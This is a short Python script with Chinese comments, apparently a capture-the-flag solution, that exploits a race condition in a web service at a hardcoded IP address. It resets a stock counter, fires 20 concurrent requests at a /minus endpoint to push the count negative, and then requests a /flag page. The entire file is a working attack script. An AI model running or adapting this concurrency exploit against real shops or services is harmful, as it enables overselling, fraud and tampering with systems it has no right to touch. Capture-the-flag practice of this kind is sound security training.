import requests
from concurrent.futures import ThreadPoolExecutor

# 目标地址配置
BASE_URL = "http://202.120.222.171:30528"
MINUS_URL = f"{BASE_URL}/minus"
FLAG_URL = f"{BASE_URL}/flag"
RESET_URL = f"{BASE_URL}/reset"


def attack():
    # 重置库存为1
    requests.get(RESET_URL)

    # 发起并发请求（至少2个请求才能让num变为负数）
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(requests.get, MINUS_URL) for _ in range(20)]  # 并发20个请求

    # 检查flag
    response = requests.get(FLAG_URL)
    if "flag" in response.text.lower():
        print("\n[+] Flag获取成功！")
        print("Flag:", response.text)
    else:
        print("\n[-] 攻击失败，未触发超卖")
        print("调试信息:", response.text)


if __name__ == "__main__":
    attack()